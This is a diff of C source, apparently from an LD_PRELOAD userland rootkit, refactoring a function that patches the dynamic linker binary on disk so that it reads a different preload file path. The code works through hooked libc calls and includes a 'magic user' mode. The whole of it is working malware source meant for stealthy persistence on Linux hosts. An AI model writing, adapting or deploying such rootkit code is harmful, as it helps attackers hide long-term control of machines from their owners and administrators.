@@ -1,3 +1,5 @@
+/* overwrites, in the contents of path, whatever oldpreload contains with whatever newpreload contains. */
+/* if int mode is MAGICUSR there is some printf output. */
 void ldpatch(const char *path, const char *oldpreload, const char *newpreload, int mode){
     if(strlen(oldpreload) != strlen(newpreload))
         return;
@@ -7,31 +9,13 @@ void ldpatch(const char *path, const char *oldpreload, const char *newpreload, i
     FILE *ofp, *nfp;
     off_t fsize;
     size_t n, m;
-    struct stat ldstat;
     mode_t ldmode;
 
-    hook(CFOPEN, C__XSTAT, CRENAME, CCHMOD, CFWRITE, CCHOWN);
+    hook(CFOPEN, CRENAME, CCHMOD, CFWRITE, CCHOWN);
 
-    ofp = call(CFOPEN, path, "rb"); // open original path.
-    if(ofp == NULL) return;
-
-    memset(&ldstat, 0, sizeof(struct stat)); // stat path for size & mode.
-    int statstat = (long)call(C__XSTAT, _STAT_VER, path, &ldstat);
-    if(statstat < 0){
-        fclose(ofp);
-        return;
-    }
-
-    fsize = ldstat.st_size;
-    ldmode = ldstat.st_mode;
-
-    // create & open new tmp path for the target.
     snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
-    nfp = call(CFOPEN, tmppath, "wb");
-    if(nfp == NULL){
-        fclose(ofp);
-        return;
-    }
+    ofp = bindup(path, tmppath, &nfp, &fsize, &ldmode);
+    if(ofp == NULL) return;
 
     int count = 0, // when this is strlen(preloadpath) we have a match & have arrived at the end of the string. then we overwrite, from the beginning.
         c = 0;     // position of the curent character in the string that we're writing over the original with.
@@ -44,8 +28,8 @@ void ldpatch(const char *path, const char *oldpreload, const char *newpreload, i
         if(n){
             for(int i = 0; i != fsize; i++){
                 if(buf[i] == oldpreload[count]){
-                    if(count == strlen(oldpreload)){ // finally.. we have arrived.
-                        for(int x = i-strlen(oldpreload); x < i; x++)
+                    if(count == LEN_OLD_PRELOAD){ // finally.. we have arrived.
+                        for(int x = i-LEN_OLD_PRELOAD; x < i; x++)
                             memcpy(&buf[x], &newpreload[c++], 1); // 18 memcpys to rule them all
                         break; // we are done here.
                     }
